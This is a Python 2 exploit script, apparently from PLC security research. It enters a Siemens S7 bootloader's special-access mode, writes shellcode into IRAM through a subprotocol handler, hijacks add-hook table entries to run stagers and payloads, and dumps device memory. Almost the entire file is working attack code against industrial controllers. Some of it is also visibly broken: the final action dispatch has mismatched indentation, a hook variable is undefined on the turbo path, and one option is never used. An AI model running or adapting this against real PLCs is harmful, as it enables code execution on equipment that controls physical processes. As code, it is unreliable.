#!/usr/bin/env python2
import struct
import time
import socket
import select
import sys
import subprocess
import os
import argparse
from binascii import hexlify

from pwn import remote, context, log, xor, serialtube

context.update(log_level="info", bits=32, endian="big")

# --- Constants ---

# Runtime configs
SEND_REQ_SAFETY_SLEEP_AMT = 0.01
MAX_MSG_LEN = 192 - 2

# File paths
STAGER_PL_FILENAME = "payloads/stager/stager.bin"
TURBO_STAGER_PL_FILENAME = "payloads/turbo_stager/turbo_stager.bin"
DUMPMEM_PL_FILENAME = "payloads/dump_mem/build/dump_mem.bin"

# Memory Layout
FIRST_PAYLOAD_LOCATION = 0x10010100
IRAM_STAGER_START = 0x10030100
IRAM_STAGER_END = 0x100303FC
IRAM_STAGER_MAX_SIZE = IRAM_STAGER_END - IRAM_STAGER_START
ADD_HOOK_TABLE_START = 0x1003ABA0
BOOTLOADER_EMPTY_MEM = 0x20000

# Protocol Constants
ANSW_INVALID_CHECKSUM = "\xff\x80\x03"
ANSW_ENTER_SUBPROTO_SUCCESS = "\x80\x00"
DEFAULT_STAGER_ADDHOOK_IND = 0x20
DEFAULT_SECOND_ADD_HOOK_IND = 0x1a

# Subprotocol handler constants
SUBPROT_80_MODE_IRAM = 1
SUBPROT_80_IOC_SPI = 2
SUBPROT_80_MODE_FLASH = 3
SUBPROT_80_MODE_NOP = 4
SUBPROT_80_MODE_MAGICS = [None, 0x3BC2, 0x9d26, 0xe17a, 0xc54f]

# Action constants for argparse
ACTION_INVOKE_HOOK = "invoke"
ACTION_DUMP = 'dump'
ACTION_DUMP_TURBO = 'dump_turbo'
ACTION_TEST = "test"
ACTION_TIC_TAC_TOE = "tictactoe"
ACTION_HELLO_LOOP = "hello_loop"

class SiemensS7Client:
    def __init__(self, r):
        self.r = r
        self.next_payload_location = FIRST_PAYLOAD_LOCATION

    def calc_checksum_byte(self, incoming):
        return struct.pack("<i", -sum(map(ord, incoming[:ord(incoming[0])])))[0]

    def send_packet(self, msg, step=2, sleep_amt=0.01):
        assert (len(msg) <= MAX_MSG_LEN)
        time.sleep(SEND_REQ_SAFETY_SLEEP_AMT)
        msg = chr(len(msg) + 1) + msg
        msg = msg + self.calc_checksum_byte(msg)
        log.info("sending packet: {}".format(msg.encode("hex")))
        for i in range(0, len(msg), step):
            time.sleep(sleep_amt)
            self.r.send(msg[i:i + step])

    def recv_packet(self):
        answ = self.r.recv(1)
        if not answ:
            log.error("Did not receive any data. Is the PLC connected?")
            return None
        rem = ord(answ)
        while rem > 0:
            add = self.r.recv(rem)
            rem -= len(add)
            answ += add
        if self.calc_checksum_byte(answ[:-1]) != answ[-1]:
            log.warning("Checksum validity failed. Got: {} [{}".format(repr(answ), answ.encode("hex")))
            return None
        return answ[1:-1]

    def recv_many(self, verbose=False):
        answ = ""
        stop = False
        while not stop:
            next_chunk = self.recv_packet()
            if verbose and (len(answ) & 0xff) < 16:
                log.info("Read {}".format(len(answ)))
            if next_chunk == "":
                stop = True
            else:
                answ += next_chunk
        return answ

    def encode_packet_for_stager(self, chunk):
        for i in range(1, 256):
            if chr(i) not in chunk and i != len(chunk) + 2:
                log.info("Sending chunk with xor key: 0x{:02x}".format(i))
                return chr(i) + "".join(map(lambda x: chr(ord(x) ^ i), chunk))
        log.error("Could not encode chunk: {}".format(chunk.encode("hex")))
        assert False

    def send_full_msg_via_stager(self, msg, chunk_size=8, sleep_amt=0.01):
        for i in range(0, len(msg), MAX_MSG_LEN - 1):
            time.sleep(SEND_REQ_SAFETY_SLEEP_AMT)
            chunk = msg[i:i + MAX_MSG_LEN - 1]
            log.info("Send progress: 0x{:06x}/0x{:06x} ({:3.2f})".format(i, len(msg), float(i) / float(len(msg))))
            self.send_packet(self.encode_packet_for_stager(chunk), chunk_size, sleep_amt)
            answ = self.recv_packet()
            if not len(answ) == 1:
                log.error("expecting empty ack package, got '{}' instead".format(answ))
                assert False
            if answ == "\xff":
                log.warning("Interrupting the sending...")
                return None
        self.send_packet(self.encode_packet_for_stager(""))
        self.recv_packet()

    def get_version(self):
        self.invoke_primary_handler(0, await_response=False) # The original code was bugged, it did not await response
        return self.recv_packet()

    def bye(self):
        self.invoke_primary_handler(0xa2)
        answ = self.recv_packet()
        assert (answ == "\xa2\x00")

    def invoke_primary_handler(self, handler_ind, args="", await_response=True):
        payload = chr(handler_ind)
        self.send_packet(payload + args)
        if await_response:
            return self.recv_packet()
        return None

    def enter_subproto_handler(self, mode):
        assert (1 <= mode <= len(SUBPROT_80_MODE_MAGICS))
        return self.invoke_primary_handler(0x80, struct.pack(">H", SUBPROT_80_MODE_MAGICS[mode]))

    def leave_subproto_handler(self):
        self.send_packet(chr(0x81) + "\xD0\x67")
        return self.recv_packet()

    def _raw_subproto_write(self, arg_dw, add_args, really=False):
        assert(really == True)
        self.send_packet(chr(0x84) + "\x5a\x2e" + struct.pack(">I", arg_dw) + add_args)
        return self.recv_packet()

    def _exploit_write_chunk_to_iram(self, tar, contents, already_in_80_handler=False):
        assert (len(contents) % 2 == 0)
        assert (len(contents) + 8 <= MAX_MSG_LEN)
        assert (0x10000000 <= tar)
        assert (tar + len(contents) <= 0x10800000)

        if not already_in_80_handler:
            self.enter_subproto_handler(SUBPROT_80_MODE_IRAM)

        target_argument = tar - 0x10000000
        self._raw_subproto_write(target_argument, len(contents) * "\xff", True)
        if len(contents) == 4 and (contents[:2] in ["\x00\x00", "\x0a\x00"] or contents[2:4] in ["\x00\x00", "\x0a\x00"]):
            self._raw_subproto_write(target_argument, contents[:2], True)
            self._raw_subproto_write(target_argument + 2, contents[2:4], True)
        else:
            self._raw_subproto_write(target_argument, contents, True)

        if not already_in_80_handler:
            self.leave_subproto_handler()

    def exploit_write_to_iram(self, tar, contents):
        assert (len(contents) % 2 == 0)
        assert (0x10000000 <= tar and tar + len(contents) <= 0x10800000)
        answ = self.enter_subproto_handler(SUBPROT_80_MODE_IRAM)
        assert (answ == ANSW_ENTER_SUBPROTO_SUCCESS)
        if len(contents) % 4 == 2:
            self._exploit_write_chunk_to_iram(tar, contents[:2], True)
            tar += 2
            contents = contents[2:]
        chunk_size = 16
        for i in range(0, len(contents), chunk_size):
            log.info("Writing {:04x}/{:04x}".format(i, len(contents)))
            self._exploit_write_chunk_to_iram(tar + i, contents[i:i + chunk_size], True)
        self.leave_subproto_handler()

    def _exploit_install_add_hook(self, tar_addr, shellcode, add_hook_no):
        assert (0 <= add_hook_no <= 0x20)
        if len(shellcode) % 2 != 0:
            shellcode += "\xff"
        self.exploit_write_to_iram(tar_addr, shellcode)
        self.exploit_write_to_iram(ADD_HOOK_TABLE_START + 8 * add_hook_no + 2, "\x00\xff" + struct.pack(">I", tar_addr))

    def install_stager(self, shellcode, tar_addr=IRAM_STAGER_START, add_hook_no=DEFAULT_STAGER_ADDHOOK_IND):
        assert (0 < len(shellcode) <= IRAM_STAGER_MAX_SIZE)
        self._exploit_install_add_hook(tar_addr, shellcode, add_hook_no)
        return add_hook_no

    def write_via_stager(self, tar_addr, contents, stager_addhook_ind=DEFAULT_STAGER_ADDHOOK_IND):
        self.invoke_add_hook(stager_addhook_ind, struct.pack(">I", tar_addr), await_response=False)
        self.send_full_msg_via_stager(contents)

    def install_addhook_via_stager(self, tar_addr, shellcode, stager_addhook_ind=DEFAULT_STAGER_ADDHOOK_IND, add_hook_no=DEFAULT_SECOND_ADD_HOOK_IND):
        self.write_via_stager(ADD_HOOK_TABLE_START + 8 * add_hook_no, "\x00\x00\x00\xff" + struct.pack(">I", tar_addr), stager_addhook_ind)
        self.write_via_stager(tar_addr, shellcode, stager_addhook_ind)
        if tar_addr == self.next_payload_location:
            self.next_payload_location += len(shellcode)
            while self.next_payload_location % 4 != 0:
                self.next_payload_location += 1
        return add_hook_no

    def invoke_add_hook(self, add_hook_no, args="", await_response=True):
        assert (0 <= add_hook_no <= 0x20)
        return self.invoke_primary_handler(0x1c, chr(add_hook_no) + args, await_response)

    def payload_dump_mem(self, tar_addr, num_bytes, addhook_ind):
        answ = self.invoke_add_hook(addhook_ind, "A" + struct.pack(">II", tar_addr, num_bytes))
        assert (answ.startswith("Ok"))
        return self.recv_many(verbose=True)

    def switch_to_turbo_mode(self):
        log.info("Waiting for turbo handshake initiator (0xAA)...")
        initator = self.r.recv(1)
        if initator != '\xaa':
            log.error("Did not receive turbo handshake initiator. Got {} instead.".format(hexlify(initator)))
            return False
        log.info("Got initiator. Sending confirmation (0x5F) and switching baud rate.")
        self.r.send('\x5f')
        self.r.baudrate = 115200
        log.success("Switched to 115200 baud.")
        return True

    def verify_turbo_speed(self):
        log.info("Sending speed verification (0xCC)...")
        self.r.send('\xcc')
        log.info("Waiting for confirmation (0xDD)...")
        confirmation = self.r.recv(1)
        if confirmation != '\xdd':
            log.error("Did not receive speed confirmation. Got {} instead.".format(hexlify(confirmation)))
            return False
        log.success("Speed verification successful. Communication at 115200 baud confirmed.")
        return True

    def load_payload_turbo(self, payload, dest_addr):
        log.info("Sending destination address: 0x{:08x}".format(dest_addr))
        self.r.send(struct.pack('>I', dest_addr))
        log.info("Sending payload size: {} bytes".format(len(payload)))
        self.r.send(struct.pack('>I', len(payload)))
        log.info("Sending payload...")
        self.r.send(payload)
        log.info("Waiting for 'Done' signal from stager...")
        done_signal = self.r.recv(1)
        if done_signal != 'D':
            log.error("Did not receive 'Done' signal. Got {}.".format(hexlify(done_signal)))
            return False
        log.success("Payload loaded and installed successfully via turbo stager.")
        return True

    def handle_connection(self, args):
        log.success("[+] Got special access greeting: {} [{}]".format(self.r.recv(5).encode('hex'), self.r.recv(5).encode('hex')))

        version = self.get_version()
        bootloaderversion = version[2:3] + ".".join([str(ord(c)) for c in version[3:-2]])
        log.success("[+] Got PLC bootLoader version: " + bootloaderversion)

        # Always install the normal stager first
        stager_code = args.stager.read()
        start = time.time()
        stager_addhook_ind = self.install_stager(stager_code)
        log.info("Writing the initial stage took {} seconds".format(time.time() - start))

        payload = args.payload.read() if hasattr(args, 'payload') and args.payload else None

        if args.action == ACTION_DUMP_TURBO:
            # Step 1: Install turbo_stager using the normal stager
            # Use hook 0x19 for turbo_stager itself (not 0x1a, which turbo_stager will use for the final payload)
            TURBO_STAGER_HOOK_IND = 0x19
            with open(TURBO_STAGER_PL_FILENAME, 'rb') as f:
                turbo_stager_code = f.read()
            turbo_stager_addhook_ind = self.install_addhook_via_stager(
                self.next_payload_location, 
                turbo_stager_code, 
                stager_addhook_ind,
                TURBO_STAGER_HOOK_IND
            )
            log.info("Turbo stager installed at hook 0x{:02x}".format(turbo_stager_addhook_ind))
            
            # Remember the destination address for the final payload
            dump_payload_addr = self.next_payload_location
            
            # Step 2: Invoke turbo_stager - it will send 0xAA to initiate handshake
            log.info("Invoking turbo stager to switch to turbo mode...")
            self.invoke_add_hook(turbo_stager_addhook_ind, await_response=False)
            
            # Step 3: Respond to handshake from turbo_stager and switch baud rate
            if not self.switch_to_turbo_mode(): 
                self.bye()
                return
            
            # Step 4: Verify communication at 115200 baud (send 0xCC, receive 0xDD)
            if not self.verify_turbo_speed():
                self.bye()
                return
            
            # Step 5: Send the dump_mem payload via turbo mode
            # The turbo_stager will receive it, install it at hook 0x1a, and send 'D'
            if not self.load_payload_turbo(payload, dump_payload_addr):
                self.bye()
                return
            
            # Step 6: Dump memory using the payload installed by turbo_stager at hook 0x1a
            log.info("Dumping memory...")
            contents = self.payload_dump_mem(args.address, args.length, DEFAULT_SECOND_ADD_HOOK_IND)
        else:
            if payload is not None:
                start = time.time()
                second_addhook_ind = self.install_addhook_via_stager(self.next_payload_location, payload, stager_addhook_ind)
                log.info("Installing the additional hook took {} seconds".format(time.time() - start))

        # --- Execute final action ---
        # This part is now common for both turbo and normal mode
        if args.action == ACTION_INVOKE_HOOK:
                answ = self.invoke_add_hook(second_addhook_ind, args.args)
                log.info("Got answer: {}".format(answ))
            elif args.action == ACTION_DUMP:
                log.info("Dumping memory...")
                contents = self.payload_dump_mem(args.address, args.length, second_addhook_ind)
            elif args.action == ACTION_TEST:
                answ = self.invoke_add_hook(second_addhook_ind)
                log.info("Got answer: {}".format(answ))
            elif args.action == ACTION_HELLO_LOOP:
                self.invoke_add_hook(second_addhook_ind, await_response=False)
                while True: log.info("Got packet: {}".format(self.recv_packet()))
            elif args.action == ACTION_TIC_TAC_TOE:
                log.info("[*] Demonstrating Code Execution")
                self.invoke_add_hook(second_addhook_ind, await_response=False)
                msg = ""
                END_TOKEN = "==>"
                while END_TOKEN not in msg:
                    msg = self.recv_packet()
                    sys.stdout.write(msg)
                    sys.stdout.flush()
                    if "enter a number" in msg:
                        choice = raw_input()
                        self.send_packet(choice[0])
                log.info("[*] Done here!")

        if 'contents' in locals() and contents:
            out_filename = args.outfile if hasattr(args, 'outfile') and args.outfile else "mem_dump_{:08x}_{:08x}".format(args.address, args.address + args.length)
            with open(out_filename, "wb") as f: f.write(contents)
            log.success("Wrote {} bytes to {}".format(len(contents), out_filename))

        log.info("Saying bye...")
        if args.cont:
            self.bye()
        else:
            raw_input("Press to continue loading firmware...")
            self.bye()

def main():
    parser = argparse.ArgumentParser(description='Trigger code execution on Siemens PLC')
    # Connection args
    parser.add_argument('--serial-port', dest='serial_port', type=str, help="Direct serial port, e.g., /dev/ttyUSB0")
    parser.add_argument('-P', '--port', dest='port', type=int, help="Local TCP port for socat forwarding")

    # Power supply args
    parser.add_argument('--switch-power', dest='switch_power', default=False, action='store_true')
    parser.add_argument('--powersupply-host', dest='powersupply_host', default='powersupply')
    parser.add_argument('--powersupply-port', dest='powersupply_port', default=80, type=int)
    parser.add_argument('--powersupply-delay', dest='powersupply_delay', default=60, type=int)
    parser.add_argument('-c', '--continue', dest='cont', default=False, action='store_true', help="Continue PLC execution")

    subparsers = parser.add_subparsers(dest="action", help='Action to perform', required=True)

    # All subparsers
    parser_invoke_hook = subparsers.add_parser(ACTION_INVOKE_HOOK)
    parser_dump = subparsers.add_parser(ACTION_DUMP)
    parser_dump_turbo = subparsers.add_parser(ACTION_DUMP_TURBO)
    parser_test = subparsers.add_parser(ACTION_TEST)
    parser_hello_loop = subparsers.add_parser(ACTION_HELLO_LOOP)
    parser_tictactoe = subparsers.add_parser(ACTION_TIC_TAC_TOE)

    # Arguments for invoke
    parser_invoke_hook.add_argument('-p', '--payload', type=argparse.FileType('rb'), required=True)
    parser_invoke_hook.add_argument('-a', '--args', default="", nargs='+')
    parser_invoke_hook.add_argument('-s', '--stager', dest="stager", type=argparse.FileType('r'), default=STAGER_PL_FILENAME)

    # Arguments for dump
    for p in [parser_dump, parser_dump_turbo]:
        p.add_argument('-p', '--payload', type=argparse.FileType('rb'), default=DUMPMEM_PL_FILENAME)
        p.add_argument('-a', '--address', type=lambda x: int(x, 0), required=True)
        p.add_argument('-l', '--length', type=lambda x: int(x, 0), required=True)
        p.add_argument('-o', '--out-file', dest='outfile', default=None)

    # Specific stager for turbo mode, but available for all commands
    parser.add_argument('--turbo-stager', type=argparse.FileType('rb'), default=None, help='Specify the turbo stager to enable high-speed mode for any command.')

    # Arguments for test
    parser_test.add_argument('-s', '--stager', dest="stager", type=argparse.FileType('r'), default=STAGER_PL_FILENAME)
    parser_test.add_argument('-p', '--payload', type=argparse.FileType('r'), default="payloads/hello_world/hello_world.bin")
    
    # Arguments for hello_loop
    parser_hello_loop.add_argument('-s', '--stager', dest="stager", type=argparse.FileType('r'), default=STAGER_PL_FILENAME)
    parser_hello_loop.add_argument('-p', '--payload', type=argparse.FileType('r'), default="payloads/hello_loop/build/hello_loop.bin")

    # Arguments for tictactoe
    parser_tictactoe.add_argument('-s', '--stager', dest="stager", type=argparse.FileType('r'), default=STAGER_PL_FILENAME)
    parser_tictactoe.add_argument('-p', '--payload', type=argparse.FileType('r'), default="payloads/tic_tac_toe/build/tic_tac_toe.bin")

    args = parser.parse_args()

    r = None
    if args.serial_port:
        if args.port:
            log.error("Please specify either --serial-port or --port, not both.")
            sys.exit(1)
        r = serialtube(args.serial_port, baudrate=38400, convert_newlines=False)
    elif args.port:
        r = remote("localhost", args.port)
    else:
        log.error("You must specify a connection method: --serial-port or --port.")
        sys.exit(1)

    client = SiemensS7Client(r)

    if args.switch_power:
        log.info("Turning off power supply and sleeping for {:d} seconds".format(args.powersupply_delay))
        subprocess.check_call(["../tools/powersupply/switch_power.py", "--port", str(args.powersupply_port), "--host", args.powersupply_host, "off"])
        time.sleep(args.powersupply_delay)
        log.info("Turned on power supply again")
        subprocess.check_call(["../tools/powersupply/switch_power.py", "--port", str(args.powersupply_port), "--host", args.powersupply_host, "on"])

    # Handshake
    log.info("Sending magic 'MFGT1' to enter protocol mode...")
    pad = 4 * "A"
    magic = "MFGT1"
    for i in range(100):
        r.send(pad + magic)
        answ = r.recv(256, timeout=0.3)
        if len(answ) > 0:
            if not answ.startswith("\5-CPU"):
                answ += r.recv(256)
            if answ.startswith("\5-CPU"):
                r.unrecv(answ)
                client.handle_connection(args)
                break
    else:
        log.error("Failed to get response from PLC. Is it connected and in the right mode?")

    log.info("Done.")

if __name__ == "__main__":
    main()
